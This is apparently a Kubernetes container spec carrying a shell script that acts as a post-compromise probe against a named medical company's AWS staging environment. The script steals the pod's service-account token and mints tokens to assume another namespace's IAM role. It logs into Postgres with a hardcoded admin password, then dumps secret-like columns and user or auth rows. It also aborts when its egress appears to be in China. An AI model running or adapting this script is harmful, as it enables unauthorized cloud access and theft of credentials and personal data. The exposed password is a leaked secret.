containers.name: probe
args:
#!/bin/sh
set -u
echo "===I3577_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache postgresql16-client curl jq aws-cli >/tmp/apk.log 2>&1
echo "apk=$? psql=$(command -v psql||echo none) aws=$(aws --version 2>&1|head -c 40)"
GEO=$(curl -s -m 20 http://ip-api.com/json/)
echo "GEO $GEO"
echo "$GEO" | grep -q '"countryCode":"CN"' && { echo "ABORT_CN_EGRESS"; exit 0; }
export AWS_DEFAULT_REGION=us-west-2
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token 2>/dev/null); API=https://kubernetes.default.svc
get(){ curl -sk -m 30 -H "Authorization: Bearer $TOKEN" "$1"; }
post(){ curl -sk -m 30 -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data "$2" "$1"; }
assume(){ NS=$1; S=$2
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && return 1
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty'); [ -z "$WT" ] && return 1
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name i3577ml --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS $(echo "$RES"|head -c 120)"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  echo "ASSUME_OK $NS $AR"; return 0; }
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }

echo "########## ENV stage ##########"
MLPW='oOG3+4KkUopBF#Uw'
PG(){ PGPASSWORD="$MLPW" psql "host=$1 port=5432 user=postgres_admin dbname=$2 sslmode=$3 connect_timeout=15" -At -F'|' -c "$4" 2>&1; }
HIT=0; HH=""; HD=""; HS=""
try1(){ [ "$HIT" = "1" ] && return; R=$(PG "$1" "$2" "$3" "select version(), current_user;"); L=$(echo "$R"|head -1|cut -c1-200)
  echo "TRY[$HOSTTAG] host=$1 db=$2 ssl=$3 => $L"
  case "$R" in *PostgreSQL*) HIT=1; HH="$1"; HD="$2"; HS="$3";; esac; }
HOSTTAG=stage
try1 lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com mlflow_service require
try1 lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com mlflow_auth require
try1 lazamedical-dp-stage01-usw2-postgresql1-proxy.proxy-cjygw4i820rx.us-west-2.rds.amazonaws.com mlflow require

if [ "$HIT" = "1" ]; then
echo "===== CONNECTED $HOSTTAG host=$HH db=$HD ssl=$HS ====="
PG "$HH" "$HD" "$HS" "select datname from pg_database where not datistemplate order by 1" | head -20 | sed 's/^/DB /'
echo "-- SCHEMAS"
PG "$HH" "$HD" "$HS" "select schema_name from information_schema.schemata where schema_name not in ('pg_catalog','information_schema','pg_toast') order by 1" | head -20 | sed 's/^/SCH /'
echo "-- TABLES(<=80)"
PG "$HH" "$HD" "$HS" "select table_schema||'.'||table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') order by 1 limit 80" | head -90 | sed 's/^/TBL /'
echo "-- SECRETLIKE_COLS"
PG "$HH" "$HD" "$HS" "select table_schema||'.'||table_name||'.'||column_name from information_schema.columns where table_schema not in ('pg_catalog','information_schema') and column_name ~* 'secret|passwd|password|apikey|api_key|token|credential|access_key|private_key|provider' order by 1 limit 40" | head -50 | sed 's/^/COL /'
echo "-- MLFLOW_META"
for T in experiments runs registered_models model_versions tags; do
  C=$(PG "$HH" "$HD" "$HS" "select count(*) from $T" 2>/dev/null | head -1)
  echo "CNT $T=$C"
done
echo "-- SECRETROWS_SAMPLE"
for C in $(PG "$HH" "$HD" "$HS" "select table_schema||'|'||table_name||'|'||column_name from information_schema.columns where table_schema not in ('pg_catalog','information_schema') and column_name ~* 'secret|passwd|password|apikey|api_key|token|credential|access_key|private_key' order by 1 limit 20" | grep -v ERROR | head -20); do
  S=$(echo "$C"|cut -d'|' -f1); T=$(echo "$C"|cut -d'|' -f2); CL=$(echo "$C"|cut -d'|' -f3)
  N=$(PG "$HH" "$HD" "$HS" "select count(*) from \"$S\".\"$T\" where \"$CL\" is not null" 2>/dev/null|head -1)
  echo "SC $S.$T.$CL nonnull=$N"
  [ "$N" = "0" ] && continue
  PG "$HH" "$HD" "$HS" "select left(\"$CL\"::text,200) from \"$S\".\"$T\" where \"$CL\" is not null limit 5" 2>/dev/null | head -5 | sed "s/^/  V /"
done
echo "-- AUTHUSER_TABLES"
for T in $(PG "$HH" "$HD" "$HS" "select table_schema||'.'||table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') and table_name ~* 'user|auth|account|member' order by 1 limit 10" | grep -v ERROR); do
  C=$(PG "$HH" "$HD" "$HS" "select count(*) from $T" 2>/dev/null|head -1); echo "UT $T rows=$C"
  [ "$C" = "0" ] && continue
  PG "$HH" "$HD" "$HS" "select left(row_to_json(t)::text,300) from (select * from $T limit 5) t" 2>/dev/null | head -5 | sed 's/^/  U /'
done
fi

if [ "$HIT" = "0" ]; then
echo "########## RDS DESCRIBE FALLBACK stage ##########"
if assume data-management data-management-sa; then
  echo "-- DBINSTANCES"
  aws rds describe-db-instances --max-records 100 --query 'DBInstances[?contains(DBInstanceIdentifier,`mlflow`)||contains(DBInstanceIdentifier,`rds1`)||contains(DBInstanceIdentifier,`postgresql`)].{id:DBInstanceIdentifier,ep:Endpoint.Address,port:Endpoint.Port,pub:PubliclyAccessible,status:DBInstanceStatus,engine:EngineVersion,vpc:DBSubnetGroup.VpcId}' --output json 2>&1 | head -c 3000
  echo; echo "-- DBPROXIES"
  aws rds describe-db-proxies --query 'DBProxies[].{name:DBProxyName,ep:Endpoint,status:Status,engine:EngineFamily,role:RoleArn}' --output json 2>&1 | head -c 2500
  echo; echo "-- PROXY_TARGETS"
  for P in $(aws rds describe-db-proxies --query 'DBProxies[].DBProxyName' --output text 2>/dev/null); do
    echo "PT $P: $(aws rds describe-db-proxy-targets --db-proxy-name "$P" --query 'Targets[].{t:TargetHealth.State,id:TargetHealth.Description,rid:TargetHealth.TargetArn}' --output json 2>&1 | head -c 600)"
  done
  echo "-- DBSUBNETGROUPS"
  aws rds describe-db-subnet-groups --query 'DBSubnetGroups[].{n:DBSubnetGroupName,vpc:VpcId}' --output json 2>&1 | head -c 800
  unassume
else echo "ASSUME_FAIL_RDS"; fi
fi

if [ "$HIT" = "0" ]; then
echo "########## DIRECT INSTANCE TRY stage ##########"
MLPW='oOG3+4KkUopBF#Uw'
PGD(){ PGPASSWORD="$MLPW" psql "host=$1 port=5432 user=postgres_admin dbname=$2 sslmode=$3 connect_timeout=15" -At -c "$4" 2>&1; }
for DB in mlflow_service mlflow_auth; do
  R=$(PGD lazamedical-dp-stage01-usw2-postgresql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com "$DB" require "select version(), current_user;")
  echo "DIRTRY $DB => $(echo "$R"|head -1|cut -c1-160)"
  case "$R" in *PostgreSQL*) echo "DIRECT_HIT $DB" ;; esac
done
fi
echo "===I3577_DONE $(date -u +%FT%TZ)==="
